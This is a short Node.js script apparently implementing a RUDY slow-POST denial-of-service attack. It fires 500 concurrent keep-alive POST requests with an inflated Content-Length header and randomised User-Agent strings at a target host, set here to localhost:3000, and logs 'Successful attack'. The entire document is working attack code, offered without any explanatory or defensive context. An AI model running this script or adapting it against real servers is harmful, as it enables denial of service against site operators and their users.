const request = require('request')
const useragent = require('random-useragent')
const rp = require('request-promise')
const fs = require('fs')

let stream = fs.createReadStream('payload.txt')

const host = 'http://localhost:3000/'
const connections = 500

const options = {
  method: 'POST',
  uri: host,
  headers: {
    'Connection': 'keep-alive',
    'Content-Length': '1048576',
    'User-Agent': useragent.getRandom()
  },
  formData: {
    file: stream
  }
}

rudyAttack()

function rudyAttack() {
  for(let i = 0; i < connections; i++) {
    attack()
  }
}

function attack() {
  rp(options)
  .then(() => {
    console.log('Successful attack')
    closeStream()
  })
  .catch(err => {
    console.error({ err })
    closeStream()
  })
}

function closeStream() {
  stream.close()
}

